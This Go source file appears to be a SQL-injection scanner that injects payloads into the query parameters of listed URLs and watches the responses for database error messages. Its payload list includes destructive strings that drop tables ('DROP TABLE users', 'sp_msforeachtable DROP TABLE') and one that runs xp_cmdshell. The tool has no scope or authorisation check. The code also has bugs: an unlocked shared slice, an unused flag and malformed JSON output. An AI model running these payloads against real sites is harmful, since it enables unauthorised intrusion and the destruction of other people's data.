package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sync"
	"time"
)

var (
	sqlErrors = []string{
		"SQL syntax", "MySQL server has gone away", "SQLSTATE", "SQL Error",
		"ORA-", "PLS-", "PostgreSQL ERROR", "SQLite3::SQLException",
		"ODBC SQL Server Driver", "Microsoft SQL Native Client error",
		"Unclosed quotation mark after the character string", "Warning: mysql_",
		"Warning: pg_", "You have an error in your SQL syntax",
		"supplied argument is not a valid MySQL result resource",
		"SQL query failed", "unterminated quoted string at or near",
		"syntax error at or near", "unexpected end of SQL command",
		"Warning: odbc_exec()", "Microsoft OLE DB Provider for SQL Server error",
		"Invalid query", "Unterminated string constant", "quoted string not properly terminated",
		"SQLServerException", "ORA-00933", "ORA-01400", "ORA-01858", "ORA-01756",
		"Error converting data type", "Incorrect syntax near",
	}

	injectionPatterns = []string{
		"'", "\"", ".", "/", ",", ":", ";", "-", "()", "*", "&", "$", "%",
		" OR 1=1", " UNION SELECT ", " AND 1=1", " ORDER BY 1--",
		"admin'--", "1' OR '1'='1", "1 UNION SELECT 1,2,3--",
		"1' AND '1'='1", "' OR 'a'='a", "';--", "'; DROP TABLE users;--",
		"'; EXEC xp_cmdshell('dir');--", "' OR '1'='1' --", "' OR 'x'='x'",
		"' OR ''='", "' OR '1'='1' --+- ", "admin' OR 1=1", "admin' --",
		"' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "'; EXEC sp_msforeachtable 'DROP TABLE ?'--",
		"' AND 1=2 UNION SELECT 1, 'anotheruser', 'doesntmatter', 1--",
	}
)

type Result struct {
	URL       string `json:"url"`
	Parameter string `json:"parameter"`
	Pattern   string `json:"pattern"`
	Error     string `json:"error"`
}

func checkSQLError(body string) string {
	for _, err := range sqlErrors {
		if matched, _ := regexp.MatchString(err, body); matched {
			return err
		}
	}
	return ""
}

func injectAndCheck(u string, depth int, outputFile string, lock *sync.Mutex, wg *sync.WaitGroup, results *[]Result) {
	defer wg.Done()

	parsedURL, err := url.Parse(u)
	if err != nil {
		fmt.Printf("Error parsing URL: %s\n", err)
		return
	}

	queryParams, _ := url.ParseQuery(parsedURL.RawQuery)
	for param := range queryParams {
		for _, pattern := range injectionPatterns[:depth] {
			originalValue := queryParams.Get(param)
			injectedValue := originalValue + pattern
			queryParams.Set(param, injectedValue)

			parsedURL.RawQuery = queryParams.Encode()
			injectedURL := parsedURL.String()

			fmt.Printf("[*] Testing %s\n", injectedURL)

			resp, err := http.Get(injectedURL)
			if err != nil {
				continue
			}

			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			if errMsg := checkSQLError(string(body)); errMsg != "" {
				result := Result{
					URL:       u,
					Parameter: param,
					Pattern:   pattern,
					Error:     errMsg,
				}
				*results = append(*results, result)
				fmt.Printf("[!] Potential SQL Injection vulnerability detected:\n")
				fmt.Printf("    URL: %s\n", injectedURL)
				fmt.Printf("    Parameter: %s\n", param)
				fmt.Printf("    Pattern: %s\n", pattern)
				fmt.Printf("    Error: %s\n", errMsg)

				if outputFile != "" {
					lock.Lock()
					file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
					if err != nil {
						fmt.Printf("Error opening file: %s\n", err)
						lock.Unlock()
						continue
					}
					jsonData, _ := json.Marshal(result)
					file.Write(jsonData)
					file.WriteString(",\n")
					file.Close()
					lock.Unlock()
				}
			}

			queryParams.Set(param, originalValue)
		}
	}
}

func main() {
	urlsFile := flag.String("urls-file", "", "Path to the file containing URLs")
	output := flag.String("output", "", "Output file to save results (JSON format)")
	threads := flag.Int("threads", 5, "Number of threads to use")
	depth := flag.Int("depth", 1, "Depth of injection patterns to test (1-3)")
	ignoreErrors := flag.Bool("ignore-errors", false, "Ignore connection errors and continue scanning")
	flag.Parse()

	if *urlsFile == "" {
		fmt.Println("Please provide a file containing URLs with -urls-file")
		return
	}

	file, err := os.Open(*urlsFile)
	if err != nil {
		fmt.Printf("Error opening file: %s\n", err)
		return
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	var wg sync.WaitGroup
	var lock sync.Mutex
	var results []Result

	if *output != "" {
		os.WriteFile(*output, []byte("[\n"), 0644)
	}

	startTime := time.Now()
	for _, u := range urls {
		wg.Add(1)
		go injectAndCheck(u, *depth, *output, &lock, &wg, &results)
		if *threads > 0 {
			time.Sleep(time.Second / time.Duration(*threads))
		}
	}
	wg.Wait()

	if *output != "" {
		file, err := os.OpenFile(*output, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Printf("Error opening file: %s\n", err)
			return
		}
		file.Seek(-2, os.SEEK_END)
		file.WriteString("\n]\n")
		file.Close()
	}

	fmt.Printf("\n[*] Scan completed in %s\n", time.Since(startTime))
	fmt.Printf("[*] Total URLs scanned: %d\n", len(urls))
	fmt.Printf("[*] Total vulnerable URLs found: %d\n", len(results))

	if *output != "" {
		fmt.Printf("[*] Results saved to: %s\n", *output)
	}
}
